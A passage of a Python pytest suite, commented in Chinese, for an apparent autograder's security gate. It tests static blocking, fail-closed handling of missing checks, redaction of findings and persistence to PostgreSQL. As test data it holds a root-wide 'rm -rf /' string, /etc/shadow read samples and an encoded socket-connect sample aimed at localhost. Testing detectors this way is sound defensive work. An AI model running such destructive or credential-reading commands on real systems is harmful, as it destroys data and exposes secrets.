        assert terminal_reason(decision) == "static_blocked"
        assert "未完成" in decision.rationale

    def test_not_checked_must_not_be_worded_as_safe(self) -> None:
        """I16 由机器强制：把"未检查"说成"安全"的结论文本会被判为缺陷。"""

        def unavailable(name: str, source: str) -> tuple[SecurityFinding, ...]:
            raise CheckUnavailableError("这里没有安全问题，视为通过")

        with pytest.raises(ValueError, match="I16"):
            decide_static(
                SRC_CLEAN_BASH,
                language="bash",
                checks=(StaticCheck(REQUIRED_CHECKS["bash"][0], unavailable),),
            )

    def test_validator_rejects_not_found_with_unchecked(self) -> None:
        bad = SecurityDecision(
            status="not_found",
            findings=(),
            blocking=False,
            covered=(),
            unchecked=(PYTHON_AST_CHECK_ID,),
            rationale="必需检查项全部执行完毕，未发现违规模式。",
        )
        with pytest.raises(ValueError, match="I15"):
            assert_decision_invariants(bad)

    def test_validator_rejects_found_without_findings(self) -> None:
        bad = SecurityDecision(
            status="found",
            findings=(),
            blocking=False,
            covered=(),
            unchecked=(),
            rationale="发现 0 项",
        )
        with pytest.raises(ValueError, match="I15"):
            assert_decision_invariants(bad)

    def test_validator_rejects_blocking_mismatch(self) -> None:
        """I17：`blocking` 只能由"已执行检查发现 high"决定。"""
        bad = SecurityDecision(
            status="found",
            findings=(_finding(),),
            blocking=False,
            covered=(PYTHON_AST_CHECK_ID,),
            unchecked=(),
            rationale="发现 1 项违规模式。",
        )
        with pytest.raises(ValueError, match="I17"):
            assert_decision_invariants(bad)

    def test_validator_rejects_overlapping_coverage(self) -> None:
        bad = SecurityDecision(
            status="not_checked",
            findings=(),
            blocking=False,
            covered=(PYTHON_AST_CHECK_ID,),
            unchecked=(PYTHON_AST_CHECK_ID,),
            rationale="检查未完成",
        )
        with pytest.raises(ValueError, match="covered"):
            assert_decision_invariants(bad)

    def test_conclude_rejects_overlapping_coverage(self) -> None:
        with pytest.raises(ValueError, match="covered"):
            conclude((), covered=(PYTHON_AST_CHECK_ID,), unchecked=(PYTHON_AST_CHECK_ID,))

    def test_medium_finding_does_not_change_status_semantics(self) -> None:
        """medium/low 发现照常呈现为 `found`，但**不**阻断（I17）。"""
        decision = decide_static(SRC_EVAL_ONLY, language="python")
        assert decision.status == "found"
        assert decision.blocking is False
        assert _rule_ids(decision) == {"SEC-DYNAMIC-EXEC"}
        assert decision.unchecked == ()


# --------------------------------------------------------------------------------------
# 阻断门
# --------------------------------------------------------------------------------------


class TestBlockingGate:
    """`allows_dynamic_execution` 与 `terminal_reason`：进 runner 之前的唯一依据。"""

    def test_high_severity_closes_the_gate(self) -> None:
        decision = decide_static(SRC_RM_RF_BASH, language="bash")
        assert decision.blocking is True
        assert allows_dynamic_execution(decision) is False
        assert terminal_reason(decision) == "static_blocked"

    def test_clean_submission_opens_the_gate(self) -> None:
        decision = decide_static(SRC_CLEAN_PYTHON, language="python")
        assert decision.status == "not_found"
        assert allows_dynamic_execution(decision) is True
        assert terminal_reason(decision) is None

    def test_not_checked_closes_the_gate_as_infrastructure_failure(self) -> None:
        """判断与理由：**fail-closed**。

        检查项缺失时放行 = "没检查也照跑"，正是 ADR-0002 / interfaces §8.3 禁止的降级；误判代价
        不对称（漏放恶意代码不可恢复，误停一次运行可见且可重试），因此门必须关闭。按 I18，这属于
        **技术性失败**而非安全拒绝——终态依据 `infrastructure_error`，与 `static_blocked` 可区分。
        """
        decision = decide_static(SRC_CLEAN_PYTHON, language="python", checks=[])
        assert decision.status == "not_checked"
        assert decision.blocking is False
        assert allows_dynamic_execution(decision) is False
        assert terminal_reason(decision) == "infrastructure_error"
        assert terminal_reason(decision) != "static_blocked"

    def test_medium_only_finding_keeps_the_gate_open(self) -> None:
        decision = decide_static(SRC_EVAL_ONLY, language="python")
        assert allows_dynamic_execution(decision) is True
        assert terminal_reason(decision) is None

    def test_orchestration_never_starts_running_when_gate_is_closed(self) -> None:
        """模拟编排层：门关闭时**不得**产生 `running` 迁移，且终态按 I18 区分。"""
        cases = {
            "high": decide_static(SRC_RM_RF_BASH, language="bash"),
            "unchecked": decide_static(SRC_CLEAN_PYTHON, language="python", checks=[]),
        }
        expected = {"high": ["rejected"], "unchecked": ["failed"]}
        for name, decision in cases.items():
            transitions = _orchestrate(decision)
            assert transitions == expected[name], f"{name}: {transitions}"
            assert "running" not in transitions

    def test_orchestration_reaches_running_for_clean_submission(self) -> None:
        decision = decide_static(SRC_CLEAN_PYTHON, language="python")
        assert _orchestrate(decision) == ["running", "completed"]

    def test_rejected_and_failed_are_distinguishable(self) -> None:
        blocked = decide_static(SRC_RM_RF_BASH, language="bash")
        unchecked = decide_static(SRC_CLEAN_PYTHON, language="python", checks=[])
        assert blocked.blocking is True and unchecked.blocking is False
        assert terminal_reason(blocked) != terminal_reason(unchecked)


# --------------------------------------------------------------------------------------
# 纵深防御两层：上游静态明细并入（不收敛成一处）
# --------------------------------------------------------------------------------------


class TestUpstreamStaticLayer:
    """本模块独立扫描；上游明细**可选**并入，阻断取"或"，同源按 `(category, rule_id, file)` 去重。"""

    def test_upstream_blocking_makes_my_decision_blocking(self) -> None:
        """上游判 blocking ⇒ 折算出 high ⇒ 我的 `blocking` 也为真、门关闭。"""
        decision = decide_static(
            SRC_CLEAN_BASH,
            language="bash",
            static_findings=[_static_finding(blocking=True)],
        )
        assert decision.status == "found"
        assert decision.blocking is True
        assert allows_dynamic_execution(decision) is False
        assert terminal_reason(decision) == "static_blocked"
        assert STATIC_LAYER_CHECK_ID in decision.covered
        assert decision.unchecked == ()
        upstream = decision.findings[0]
        assert upstream.rule_id == "SA-DESTRUCTIVE-ROOT-REMOVE"  # 保留上游规则 ID（来源可追溯）
        assert upstream.severity == "high"  # I17 的唯一阻断来源
        assert upstream.detected_in == "static"
        assert upstream.category == "destructive_command"  # 关键词归类

    def test_upstream_non_blocking_finding_is_not_escalated(self) -> None:
        """上游未判阻断 ⇒ 只能降档为 low，绝不能被我这边升级成阻断。"""
        decision = decide_static(
            SRC_CLEAN_BASH,
            language="bash",
            static_findings=[
                _static_finding(rule_id="SA-STYLE", severity="warning", blocking=False)
            ],
        )
        assert decision.status == "found"
        assert decision.blocking is False
        assert decision.findings[0].severity == "low"
        assert allows_dynamic_execution(decision) is True
        assert terminal_reason(decision) is None

    def test_upstream_error_without_blocking_flag_is_not_a_blocker(self) -> None:
        """`severity == "error"` 但 `blocking == False` ⇒ medium：阻断只由上游 `blocking` 决定。"""
        decision = decide_static(
            SRC_CLEAN_BASH,
            language="bash",
            static_findings=[
                _static_finding(rule_id="SA-SYNTAX", severity="error", blocking=False)
            ],
        )
        assert decision.findings[0].severity == "medium"
        assert decision.blocking is False
        assert allows_dynamic_execution(decision) is True

    def test_own_findings_and_upstream_are_or_combined(self) -> None:
        """两层都为真时仍是"或"：本模块命中高危 + 上游非阻断 ⇒ 门关闭。"""
        decision = decide_static(
            SRC_RM_RF_BASH,
            language="bash",
            static_findings=[
                _static_finding(rule_id="SA-STYLE", severity="warning", blocking=False)
            ],
        )
        assert decision.blocking is True
        assert allows_dynamic_execution(decision) is False
        assert _rule_ids(decision) == {"SEC-DESTRUCTIVE-CMD", "SA-STYLE"}

    def test_upstream_duplicates_are_merged_not_reported_twice(self) -> None:
        """同一危险不出现两条互不相干的发现：按 `(category, rule_id, file)` 去重并披露条数。"""
        decision = decide_static(
            SRC_RM_RF_BASH,
            language="bash",
            static_findings=[
                _static_finding(rule_id="SA-ROOT-REMOVE", line=1),
                _static_finding(rule_id="SA-ROOT-REMOVE", line=2),
            ],
            static_rule_aliases={"SA-ROOT-REMOVE": "SEC-DESTRUCTIVE-CMD"},
        )
        assert _rule_ids(decision) == {"SEC-DESTRUCTIVE-CMD"}
        assert len(decision.findings) == 1
        assert "同源重复 2 条" in decision.rationale

    def test_dedupe_without_alias_keeps_distinct_sources(self) -> None:
        """没有别名映射时上游规则 ID 与本模块不同：两条各自保留（不做不确定的语义合并）。"""
        decision = decide_static(
            SRC_RM_RF_BASH,
            language="bash",
            static_findings=[_static_finding(rule_id="SA-ROOT-REMOVE", line=1)],
        )
        assert _rule_ids(decision) == {"SEC-DESTRUCTIVE-CMD", "SA-ROOT-REMOVE"}

    def test_absent_upstream_layer_is_neither_covered_nor_unchecked(self) -> None:
        """`static_findings=None` ⇒ 本门禁独立成判：该层既不算跑过也不算没跑。"""
        decision = decide_static(SRC_CLEAN_BASH, language="bash")
        assert STATIC_LAYER_CHECK_ID not in decision.covered
        assert STATIC_LAYER_CHECK_ID not in decision.unchecked
        assert decision.status == "not_found"
        assert allows_dynamic_execution(decision) is True

    def test_empty_upstream_sequence_marks_the_layer_covered(self) -> None:
        decision = decide_static(SRC_CLEAN_BASH, language="bash", static_findings=[])
        assert STATIC_LAYER_CHECK_ID in decision.covered
        assert decision.findings == ()
        assert decision.status == "not_found"
        assert allows_dynamic_execution(decision) is True

    def test_upstream_layer_can_be_marked_unchecked_explicitly(self) -> None:
        """上游静态层没跑 ⇒ 显式进 `unchecked`（未检查 ≠ 安全），门关闭且为技术性失败。"""
        decision = decide_static(SRC_CLEAN_BASH, language="bash")
        degraded = mark_check_unchecked(
            decision, check_id=STATIC_LAYER_CHECK_ID, reason="上游静态层未执行"
        )
        assert degraded.status == "not_checked"
        assert STATIC_LAYER_CHECK_ID in degraded.unchecked
        assert allows_dynamic_execution(degraded) is False
        assert terminal_reason(degraded) == "infrastructure_error"

    def test_upstream_finding_location_is_redacted(self) -> None:
        converted = static_layer_finding(_static_finding(file="D:\\internal\\abs\\solution.sh"))
        assert "D:\\internal" not in converted.message
        assert "<提交文件>" in converted.message
        assert converted.rule_id == "SA-DESTRUCTIVE-ROOT-REMOVE"
        assert len(converted.message) <= 1000
        assert str(uuid.UUID(converted.finding_id)) == converted.finding_id

    def test_static_category_classification(self) -> None:
        assert classify_static_message("网络访问调用：发起外部连接") == "network_attempt"
        assert classify_static_message("读取敏感路径：影子口令") == "sensitive_path_read"
        assert classify_static_message("完全无关的说明文本") == "sandbox_violation"
        aliased = static_layer_finding(
            _static_finding(rule_id="SA-X", message="完全无关的说明文本"),
            rule_aliases={"SA-X": "SEC-REVERSE-SHELL"},
        )
        assert aliased.category == "network_attempt"  # 别名映射优先于关键词启发式


# --------------------------------------------------------------------------------------
# 脱敏
# --------------------------------------------------------------------------------------


class TestRedaction:
    """I19：finding 文本不含源码、内部绝对路径。"""

    def test_message_never_contains_source_text(self) -> None:
        marker = "TOPSECRET_MARKER_9f3a"
        sources = {
            "solution.py": SAMPLE_RM_RF_OS_SYSTEM + "# " + marker + "\n",
            "solution.sh": SAMPLE_RM_RF_BASH + "echo " + marker + "\n",
        }
        for language, name in (("python", "solution.py"), ("bash", "solution.sh")):
            decision = decide_static({name: sources[name]}, language=language)
            assert decision.findings
            for finding in decision.findings:
                assert marker not in finding.message
                assert "rm -rf" not in finding.message
                assert len(finding.message) <= 1000

    def test_sensitive_path_literal_is_not_echoed_in_message(self) -> None:
        decision = decide_static(SRC_SHADOW, language="python")
        assert decision.findings
        for finding in decision.findings:
            assert "/etc/shadow" not in finding.message

    @pytest.mark.parametrize(
        "file_name",
        [
            "D:\\internal\\abs\\solution.py",
            "/home/grader/workspace/solution.py",
            "..\\..\\solution.py",
        ],
        ids=["windows_abs", "posix_abs", "traversal"],
    )
    def test_non_whitelisted_file_name_is_placeholder(self, file_name: str) -> None:
        decision = decide_static({file_name: SAMPLE_RM_RF_OS_SYSTEM}, language="python")
        assert decision.findings
        for finding in decision.findings:
            assert "<提交文件>" in finding.message

    def test_whitelisted_relative_name_is_kept_but_has_no_source(self) -> None:
        decision = decide_static({"src/solution.py": SAMPLE_RM_RF_OS_SYSTEM}, language="python")
        assert decision.findings
        for finding in decision.findings:
            assert "src/solution.py:2" in finding.message

    def test_every_static_finding_carries_a_rule_id(self) -> None:
        for _name, language, sources, _expected in MALICIOUS_CORPUS:
            decision = decide_static(sources, language=language)
            for finding in decision.findings:
                assert finding.rule_id in RULES_BY_ID
                assert finding.detected_in == "static"

    def test_redact_text_strips_control_characters_and_truncates(self) -> None:
        collapsed = redact_text("第一行\n第二行\t第三行")
        assert "\n" not in collapsed and "\t" not in collapsed
        long_text = redact_text("x" * 1500)
        assert len(long_text) <= 1000
        assert long_text.endswith("…")

    def test_finding_ids_are_deterministic(self) -> None:
        """同一输入两次运行 ⇒ 同一 finding ID（报告可重放）。"""
        first = decide_static(SRC_RM_RF_OS_SYSTEM, language="python")
        second = decide_static(SRC_RM_RF_OS_SYSTEM, language="python")
        assert first == second


# --------------------------------------------------------------------------------------
# 不执行待测代码（样本不落盘、不执行）
# --------------------------------------------------------------------------------------


class TestNoExecution:
    """I9：分析待测代码的过程不得产生任何副作用（不写样本、不 import、不 exec、不 IO）。"""

    def test_analysis_of_side_effecting_sample_has_no_side_effects(
        self, tmp_path: pathlib.Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        marker = tmp_path / "SIDE_EFFECT_MARKER.txt"
        listener = socket.socket()
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)
        listener.settimeout(0.3)
        port = listener.getsockname()[1]
        # 样本只在内存里：既不落盘（避免主机实时防护误杀），也不被执行。
        # 建连式样本同样 Base64 存放（与模块顶部样本一致）：主机实时防护会删除盘上的
        # 完整回连形态，一旦本文件被删，"分析期不执行待测代码"就失去唯一守门用例。
        sample = _sample(
            "aW1wb3J0IHBhdGhsaWIsIHNvY2tldApwYXRobGliLlBhdGgoe21hcmtlcn0pLndyaXRlX3RleHQo"
            "J0VYRUNVVEVEJykKY29ubiA9IHNvY2tldC5zb2NrZXQoKQpjb25uLmNvbm5lY3QoKCcxMjcu"
            "MC4wLjEnLCB7cG9ydH0pKQpwcmludCgnU0lERV9FRkZFQ1RfU1RET1VUJykK"
        ).format(marker=repr(str(marker)), port=port)
        assert "conn = socket.socket()" in sample  # 解码后与明文样本逐字节一致
        try:
            decision = decide_static({"solution.py": sample}, language="python")
            untouched = decide_static(
                {"solution.sh": f"echo pwned > '{marker}'\n"}, language="bash"
            )
            # 监听套接字上没有待处理连接 ⇒ 样本真的没连过（连过就会留在 backlog 里）
            with pytest.raises(TimeoutError):
                listener.accept()
        finally:
            listener.close()

        # 分析确实发生了（样本被判高危阻断），但代码从未被执行
        assert decision.blocking is True
        assert _rule_ids(decision) == {"SEC-NETWORK-CALL"}
        assert untouched.status == "not_found"  # 写入自己的临时工作区不是越界行为
        assert not marker.exists()
        assert capsys.readouterr().out == ""
        assert "solution" not in sys.modules

    def test_module_level_side_effect_never_runs(self, tmp_path: pathlib.Path) -> None:
        """模块级副作用（导入即写文件）在分析期不得发生。"""
        marker = tmp_path / "IMPORT_MARKER.txt"
        sample = (
            "import pathlib\n"
            f"pathlib.Path({str(marker)!r}).write_text('IMPORTED')\n"
            "VALUE = eval('1+1')\n"
        )
        decision = decide_static({"solution.py": sample}, language="python")
        assert _rule_ids(decision) == {"SEC-DYNAMIC-EXEC"}
        assert not marker.exists()

    def test_python_code_text_blanks_comments_and_literals_only(self) -> None:
        """文本面只置空注释与字符串，代码本身逐字保留（行结构不变）。"""
        danger = "rm -rf" + " /"
        source = f'x = "{danger}"  # {danger}\nprint(x)\n'
        masked = python_code_text(source)
        assert danger not in masked
        assert "print(x)" in masked
        assert masked.count("\n") == source.count("\n")


# --------------------------------------------------------------------------------------
# 落库行（纯构造）
# --------------------------------------------------------------------------------------


class TestPersistenceRows:
    """行构造的纯函数部分（表列、枚举、上限）；真实写库见 `TestPostgresPersistence`。"""

    RUN_ID = "11111111-1111-4111-8111-111111111111"

    def test_rows_match_table_columns(self) -> None:
        decision = decide_static(SRC_RM_RF_OS_SYSTEM, language="python")
        rows = build_security_finding_rows(decision, evaluation_run_id=self.RUN_ID)
        assert rows
        for row in rows:
            assert tuple(row) == SECURITY_FINDING_COLUMNS
            assert row["evaluation_run_id"] == self.RUN_ID
            assert row["category"] in CONTRACT_CATEGORIES
            assert row["severity"] in {"high", "medium", "low"}
            assert row["detected_in"] in {"static", "runtime"}
            assert row["rule_id"] in RULES_BY_ID
            # 行级 blocking = "该发现是否阻断了动态执行" ⇒ 只有 high 且结论阻断时为真
            assert row["blocking"] is (row["severity"] == "high")
            assert isinstance(row["occurred_at"], datetime)
            assert row["occurred_at"].tzinfo is not None
            assert str(uuid.UUID(str(row["security_finding_id"]))) == row["security_finding_id"]

    def test_clean_decision_produces_no_rows(self) -> None:
        decision = decide_static(SRC_CLEAN_PYTHON, language="python")
        assert build_security_finding_rows(decision, evaluation_run_id=self.RUN_ID) == ()

    def test_medium_finding_row_is_not_marked_blocking(self) -> None:
        decision = decide_static(SRC_EVAL_ONLY, language="python")
        rows = build_security_finding_rows(decision, evaluation_run_id=self.RUN_ID)
        assert len(rows) == 1
        assert rows[0]["severity"] == "medium"
        assert rows[0]["blocking"] is False

    def test_upstream_row_keeps_static_rule_id(self) -> None:
        decision = decide_static(
            SRC_CLEAN_BASH, language="bash", static_findings=[_static_finding()]
        )
        rows = build_security_finding_rows(decision, evaluation_run_id=self.RUN_ID)
        assert len(rows) == 1
        assert rows[0]["rule_id"] == "SA-DESTRUCTIVE-ROOT-REMOVE"
        assert rows[0]["detected_in"] == "static"
        assert rows[0]["blocking"] is True

    def test_runtime_row_may_have_no_rule_id(self) -> None:
        runtime = _finding(
            category="network_attempt",
            severity="high",
            detected_in="runtime",
            message="沙箱内捕获到外部网络连接尝试",
            rule_id=None,
        )
        row = build_security_finding_row(
            runtime,
            evaluation_run_id=self.RUN_ID,
            decision_blocking=True,
            occurred_at=datetime.now(UTC),
        )
        assert row["detected_in"] == "runtime"
        assert row["rule_id"] is None
        assert row["blocking"] is True

    def test_invalid_inputs_are_rejected_loudly(self) -> None:
        stamp = datetime.now(UTC)
        with pytest.raises(ValueError, match="UUID"):
            build_security_finding_row(
                _finding(),
                evaluation_run_id="not-a-uuid",
                decision_blocking=True,
                occurred_at=stamp,
            )
        # 无时区 datetime 必须被拒——本用例就是要喂一个 naive 值，故显式豁免 DTZ001
        naive = datetime(2026, 1, 1)  # noqa: DTZ001
        with pytest.raises(ValueError, match="时区"):
            build_security_finding_row(
                _finding(),
                evaluation_run_id=self.RUN_ID,
                decision_blocking=True,
                occurred_at=naive,
            )
        with pytest.raises(ValueError, match="1000"):
            build_security_finding_row(
                _finding(message="x" * 1001),
                evaluation_run_id=self.RUN_ID,
                decision_blocking=True,
                occurred_at=stamp,
            )
        with pytest.raises(ValueError, match="category"):
            build_security_finding_row(
                _finding(category="not_a_category"),
                evaluation_run_id=self.RUN_ID,
                decision_blocking=True,
                occurred_at=stamp,
            )
        with pytest.raises(ValueError, match="rule_id"):
            build_security_finding_row(
                _finding(rule_id=None),
                evaluation_run_id=self.RUN_ID,
                decision_blocking=True,
                occurred_at=stamp,
            )

    def test_runtime_merge_marks_check_covered(self) -> None:
        decision = decide_static(SRC_CLEAN_PYTHON, language="python")
        runtime = _finding(
            category="sandbox_violation",
            severity="high",
            detected_in="runtime",
            message="沙箱内捕获到只读路径写入",
            rule_id=None,
        )
        merged = record_runtime_findings(decision, [runtime])
        assert merged.status == "found"
        assert merged.blocking is True
        assert RUNTIME_SANDBOX_CHECK_ID in merged.covered
        assert merged.unchecked == ()
        assert allows_dynamic_execution(merged) is False

    def test_runtime_merge_rejects_static_findings(self) -> None:
        decision = decide_static(SRC_CLEAN_PYTHON, language="python")
        with pytest.raises(ValueError, match="runtime"):
            record_runtime_findings(decision, [_finding()])

    def test_sandbox_unavailable_marks_runtime_check_unchecked(self) -> None:
        """§4.4：沙箱不可用 ⇒ 运行动态检查未执行 ⇒ 门关闭且终态为技术性失败。"""
        decision = decide_static(SRC_CLEAN_PYTHON, language="python")
        degraded = mark_check_unchecked(
            decision,
            check_id=RUNTIME_SANDBOX_CHECK_ID,
            reason="沙箱不可用（nsjail / cgroup v2 缺失）",
        )
        assert degraded.status == "not_checked"
        assert degraded.unchecked == (RUNTIME_SANDBOX_CHECK_ID,)
        assert allows_dynamic_execution(degraded) is False
        assert terminal_reason(degraded) == "infrastructure_error"


# --------------------------------------------------------------------------------------
# 真实 PostgreSQL 落库（无库时 skip —— 不伪报）
# --------------------------------------------------------------------------------------


class TestPostgresPersistence:
    """写库路径：只有真实 PostgreSQL 能验收（SQLite 不作为数据库验收）。"""

    @staticmethod
    def _seed_parent_rows(
        connection,
        *,
        run_id: str,
        question_version_id: str,
        stamp: datetime,
    ) -> str:
        """建父行：`b2.submissions` → `b2.evaluation_runs`（`rejected` + `static_blocked` 终态）。

        `security_findings.evaluation_run_id` 有外键（`fk_security_findings_run_id`）：安全发现必须挂在
        某次真实运行上，因此夹具先建提交与运行。终态语义按迁移 0007：`rejected` 必须有 `finished_at`
        **且**有 `terminal_reason`（`completed` 反而必须为空）。
        """
        import sqlalchemy as sa

        from autograder_b2.db.schema import evaluation_runs, submissions

        submission_id = str(uuid.uuid4())
        connection.execute(
            sa.insert(submissions).values(
                submission_id=submission_id,
                student_id=str(uuid.uuid4()),
                course_id=str(uuid.uuid4()),
                section_id=str(uuid.uuid4()),
                question_version_id=question_version_id,
                intake="api",
                idempotency_key=f"b2-sec-{uuid.uuid4().hex}",
                idempotency_scope=f"b2-sec-scope-{uuid.uuid4().hex}",
                submission_digest="a" * 64,
                state="validated",
                created_at=stamp,
                updated_at=stamp,
                # 迁移 0008：api 来源的行必须带 correlation_id 与 request_id（见
                # ck_submissions_provenance_shape），否则这不是一行与冻结信封一致的提交。
                correlation_id=uuid.uuid4(),
                request_id=f"b2-sec-req-{uuid.uuid4().hex}",
            )
        )
        connection.execute(
            sa.insert(evaluation_runs).values(
                evaluation_run_id=run_id,
                submission_id=submission_id,
                state="rejected",  # 静态高危阻断的终态
                stage="terminal",
                sequence=1,
                cases_done=0,
                terminal_reason="static_blocked",
                submission_digest="a" * 64,
                question_version_id=question_version_id,
                started_at=stamp,
                finished_at=stamp,
                created_at=stamp,
                updated_at=stamp,
            )
        )
        return submission_id

    @requires_postgres
    def test_findings_round_trip_through_security_findings_table(self, engine) -> None:
        import sqlalchemy as sa

        from autograder_b2.security import record_security_findings

        run_id = str(uuid.uuid4())
        stamp = datetime.now(UTC)
        decision = decide_static(SRC_RM_RF_OS_SYSTEM, language="python")
        assert decision.blocking is True
        # 该样本同时产出 high 与 medium：行级 blocking 关系才有区分度
        assert {finding.severity for finding in decision.findings} == {"high", "medium"}

        with engine.begin() as connection:
            self._seed_parent_rows(
                connection,
                run_id=run_id,
                question_version_id=str(uuid.uuid4()),
                stamp=stamp,
            )
            written = record_security_findings(
                connection, evaluation_run_id=run_id, decision=decision, occurred_at=stamp
            )
        assert written == len(decision.findings)

        with engine.connect() as connection:
            rows = (
                connection.execute(
                    sa.text(
                        "SELECT security_finding_id, evaluation_run_id, category, severity,"
                        " detected_in, rule_id, message, blocking, occurred_at"
                        " FROM b2.security_findings WHERE evaluation_run_id = :run_id"
                    ),
                    {"run_id": run_id},
                )
                .mappings()
                .all()
            )

        assert len(rows) == written
        assert {row["rule_id"] for row in rows} == _rule_ids(decision)
        assert {str(row["security_finding_id"]) for row in rows} == {
            finding.finding_id for finding in decision.findings
        }
        for row in rows:
            assert str(row["evaluation_run_id"]) == run_id
            assert row["category"] in CONTRACT_CATEGORIES
            assert row["severity"] in {"high", "medium", "low"}
            assert row["detected_in"] == "static"
            assert row["message"] and len(row["message"]) <= 1000
            assert row["occurred_at"].tzinfo is not None
            # 行级 blocking = "该发现是否阻断了动态执行"：只有 high 且结论阻断时为真
            assert row["blocking"] is (row["severity"] == "high" and decision.blocking)
        # high 阻断、medium 不阻断 —— 关系被真正区分，而不是一律取真
        assert {row["severity"]: row["blocking"] for row in rows} == {
            "high": True,
            "medium": False,
        }

        # 运行期发现同表落库：detected_in='runtime'，rule_id 允许为空
        runtime = _finding(
            category="sandbox_violation",
            severity="high",
            detected_in="runtime",
            message="沙箱内捕获到只读路径写入",
            rule_id=None,
        )
        runtime_decision = record_runtime_findings(
            decide_static(SRC_CLEAN_BASH, language="bash"), [runtime]
        )
        with engine.begin() as connection:
            runtime_written = record_security_findings(
                connection,
                evaluation_run_id=run_id,
                decision=runtime_decision,
                occurred_at=stamp,
            )
        assert runtime_written == 1
        with engine.connect() as connection:
            runtime_rows = (
                connection.execute(
                    sa.text(
                        "SELECT detected_in, rule_id, severity, blocking"
                        " FROM b2.security_findings"
                        " WHERE evaluation_run_id = :run_id AND detected_in = 'runtime'"
                    ),
                    {"run_id": run_id},
                )
                .mappings()
                .all()
            )
        assert len(runtime_rows) == 1
        assert runtime_rows[0]["rule_id"] is None
        assert runtime_rows[0]["severity"] == "high"
        assert runtime_rows[0]["blocking"] is True
